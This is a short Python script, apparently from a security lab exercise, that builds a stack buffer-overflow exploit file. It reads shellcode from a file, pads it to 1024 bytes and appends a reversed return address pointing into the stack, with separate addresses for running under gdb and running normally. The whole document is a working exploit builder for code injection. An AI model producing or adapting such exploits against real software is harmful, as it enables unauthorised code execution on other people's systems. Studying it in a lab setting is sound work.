import binascii

def endian_reverse(s):
  assert(len(s) % 2 == 0)
  result = ''
  while s:
    #strip the last 2 letters
    result += s[-2:]
    s = s[:-2]
  return result

def build_exploit(addr, output_file):
  shellcode = file('shellcode.bin').read()
  exploit_length = 1024
  return_addr = binascii.unhexlify(endian_reverse(addr))
  age_stuff = '10\n'
  exploit = age_stuff + shellcode + 'a' * (exploit_length - len(shellcode)) + return_addr
  file(output_file, 'w').write(exploit)

code_injection_addr_gdb = 'bffff328'
code_injection_addr_normal = 'bffff358'

build_exploit(code_injection_addr_normal, 'ptr-exploit')
build_exploit(code_injection_addr_gdb, 'ptr-exploit-gdb')

